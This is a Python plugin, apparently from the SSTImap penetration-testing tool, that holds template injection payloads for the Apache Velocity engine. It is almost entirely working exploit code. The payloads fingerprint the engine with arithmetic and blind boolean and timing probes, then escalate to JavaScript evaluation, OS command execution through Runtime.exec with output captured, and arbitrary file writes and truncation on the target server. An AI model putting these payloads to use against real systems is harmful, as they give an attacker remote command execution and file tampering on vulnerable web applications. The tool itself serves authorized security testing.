from plugins.languages import java
from utils import rand


class Velocity(java.Java):
    priority = 5
    plugin_info = {
        "Description": """Apache Velocity template engine""",
        "Authors": [
            "Henshin @henshin https://github.com/henshin",  # Original payload for Tplmap
            "Emilio @epinna https://github.com/epinna",  # Original Tplmap payload
            "Vladislav Korchagin @vladko312 https://github.com/vladko312",  # Updates for SSTImap
        ],
        "Engine": [
            "Homepage: https://velocity.apache.org/index.html",
            "Github: https://github.com/apache/velocity-engine",
        ],
    }

    def init(self):
        self.update_actions({
            'render': {
                'render': '{code}',
                'header': '#set($h={header[0]}+{header[1]})${{h}}',
                'trailer': '#set($t={trailer[0]}+{trailer[1]})${{t}}',
                'test_render': f'#set($c={rand.randints[0]}*{rand.randints[1]})${{c}}',
                'test_render_expected': f'{rand.randints[0]*rand.randints[1]}'
            },
            'render_error': {
                'render': '{code}',
                'header': '#set($h={header[0]}+{header[1]})',
                # Body needs to set b as the output
                'trailer': '#set($t={trailer[0]}+{trailer[1]})#set($r=("Y:/A:/"+$h+$b+$t))#include($r)',
                'test_render': f'#set($b={rand.randints[0]}*{rand.randints[1]})',
                'test_render_expected': f'{rand.randints[0]*rand.randints[1]}'
            },
            'boolean': {
                'call': 'inject',
                'test_bool_true':  '#if(false)#include("Y:/A:/true")#end',
                'test_bool_false': '#if(true)#include("Y:/A:/false")#end',
                'verify_bool_true':  '#set($o=1.0)#if($o.equals(0.1))#include("Y:/A:/xxx")#end',
                'verify_bool_false': '#set($o=1.0)#if($o.equals(1.0))#include("Y:/A:/xxx")#end'
            },
            'evaluate': {
                'call': 'render',
                'evaluate': """#set($s="")\
#set($r=$s.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval(\
$s.getClass().getConstructor($s.getClass().forName("[B"), $s.getClass()).newInstance(\
$s.getClass().forName("java.util.Base64").getDecoder().decode("{code_b64p}"), "UTF-8")))\
${{r}}\
""",
                'test_eval': '"executed".replace("xecu", "valua")',
                'test_eval_expected': 'evaluated'
            },
            'evaluate_error': {
                'call': 'render',
                'evaluate': """#set($s="")\
#set($b=$s.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval(\
$s.getClass().getConstructor($s.getClass().forName("[B"), $s.getClass()).newInstance(\
$s.getClass().forName("java.util.Base64").getDecoder().decode("{code_b64p}"), "UTF-8")))\
"""
            },
            'evaluate_boolean': {
                'call': 'inject',
                'evaluate_blind': """#set($s="")\
#set($r=$s.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval(\
$s.getClass().getConstructor($s.getClass().forName("[B"), $s.getClass()).newInstance(\
$s.getClass().forName("java.util.Base64").getDecoder().decode("{code_b64p}"), "UTF-8")))\
#if($r.equals(false))#include("Y:/A:/false")#end
"""
            },
            'evaluate_blind': {
                'call': 'inject',
                'evaluate_blind': """#set($s="")\
#set($r=$s.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval(\
$s.getClass().getConstructor($s.getClass().forName("[B"), $s.getClass()).newInstance(\
$s.getClass().forName("java.util.Base64").getDecoder().decode("{code_b64p}"), "UTF-8")))\
#if($r.equals(false) != true)#set($t=$s.getClass().forName("java.lang.Thread").sleep({delay}000))#end
"""
            },
            'execute': {
                # This payload comes from henshin's contribution on
                # issue #9.
                'call': 'render',
                'execute': """#set($s="")\
#set($sc=$s.getClass().getConstructor($s.getClass().forName("[B"), $s.getClass()))\
#set($p=$s.getClass().forName("java.lang.Runtime").getRuntime().exec($sc.newInstance(\
$s.getClass().forName("java.util.Base64").getDecoder().decode("{code_b64p}"), "UTF-8")))\
#set($n=$p.waitFor())\
#set($o=$sc.newInstance($p.inputStream.readAllBytes(), "UTF-8"))\
${{o}}\
""" 
            },
            'execute_error': {
                'call': 'render',
                'execute': """#set($s="")\
#set($sc=$s.getClass().getConstructor($s.getClass().forName("[B"), $s.getClass()))\
#set($p=$s.getClass().forName("java.lang.Runtime").getRuntime().exec($sc.newInstance(\
$s.getClass().forName("java.util.Base64").getDecoder().decode("{code_b64p}"), "UTF-8")))\
#set($n=$p.waitFor())\
#set($b=$sc.newInstance($p.inputStream.readAllBytes(), "UTF-8"))\
"""
            },
            'execute_boolean': {
                'call': 'inject',
                'execute_blind': """#set($s="")\
#set($sc=$s.getClass().getConstructor($s.getClass().forName("[B"), $s.getClass()))\
#set($p=$s.getClass().forName("java.lang.Runtime").getRuntime().exec($sc.newInstance(\
$s.getClass().forName("java.util.Base64").getDecoder().decode("{code_b64p}"), "UTF-8")))\
#set($n=$p.waitFor())\
#if($n != 0)#include("Y:/A:/xxx")#end\
"""
            },
            'execute_blind': {
                'call': 'inject',
                'execute_blind': """#set($s="")\
#set($sc=$s.getClass().getConstructor($s.getClass().forName("[B"), $s.getClass()))\
#set($p=$s.getClass().forName("java.lang.Runtime").getRuntime().exec($sc.newInstance(\
$s.getClass().forName("java.util.Base64").getDecoder().decode("{code_b64p}"), "UTF-8")))\
#set($n=$p.waitFor())\
#if($n == 0)#set($t=$s.getClass().forName("java.lang.Thread").sleep({delay}000))#end\
"""
            },
            'write': {
                'call': 'inject',
                'write': """#set($s="")\
#set($sc=$s.getClass().getConstructor($s.getClass().forName("[B"), $s.getClass()))\
#set($runtime=)\
#set($n=$s.getClass().forName("java.lang.Runtime").getRuntime().exec($sc.newInstance(\
$s.getClass().forName("java.util.Base64").getDecoder().decode("{chunk_b64p}"), "UTF-8")+">>{path}").waitFor())\
""",
                'truncate': """#set($s="")\
#set($n=$s.getClass().forName("java.lang.Runtime").getRuntime().exec("echo -n>{path}").waitFor())\
"""
            },
        })

        self.set_contexts([
                # Text context, no closures
                {'level': 0},
                {'level': 1, 'prefix': '{closure})', 'suffix': '', 'closures': java.ctx_closures},
                # This catches
                # #if(%s == 1)\n#end
                # #foreach($item in %s)\n#end
                # #define( %s )a#end
                {'level': 3, 'prefix': '{closure}#end#if(1==1)', 'suffix': '', 'closures': java.ctx_closures},
                {'level': 5, 'prefix': '*#', 'suffix': '#*'},
        ])

        self.language += ':script'
